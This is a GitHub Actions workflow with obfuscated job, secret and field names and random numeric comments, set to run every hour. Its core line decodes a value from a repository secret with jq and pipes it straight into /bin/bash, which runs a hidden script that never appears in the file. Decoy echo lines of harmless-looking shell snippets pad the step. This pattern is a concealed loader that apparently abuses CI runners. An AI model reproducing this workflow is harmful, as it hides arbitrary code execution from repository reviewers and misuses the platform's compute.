name: xingbensan0974 #26501
on: #7117
  workflow_dispatch: #11393
  schedule: #10204
    - cron: '42 * * * *' #32184
jobs:  # 20743
  build: #20751
    runs-on: ubuntu-latest #1262
    steps: #25844
      - uses: actions/checkout@v4 #26565
      - name: xingbensan0974 #2581
        env: #9508
          a13857: ${{ secrets.a13857 }} #12152
        run: |
          echo $a13857 | jq -r .k31775 | /bin/bash #19982
          echo "Export mock: export VAR=test"
          echo "Command chain: true && echo 'A' || echo 'B'"
          echo "Option mock: grep -i 'a' /etc/hosts 2>/dev/null | head -1"
          for i in {1..3}; do echo "Iter $i"; done
          echo "Curl mock: curl -s http://example.com 2>/dev/null | head -1 || echo no-curl"
          echo "Null cmd: : > /dev/null"
          echo "Glob test: echo *.sh 2>/dev/null || echo no-sh"
          echo "Command fail safe: false || echo 'Safe'"
          echo "Command sub: $(echo inside subshell)"
          echo "Test file type: [ -f /etc/passwd ] && echo File"
          echo "Random ID: $RANDOM$RANDOM"
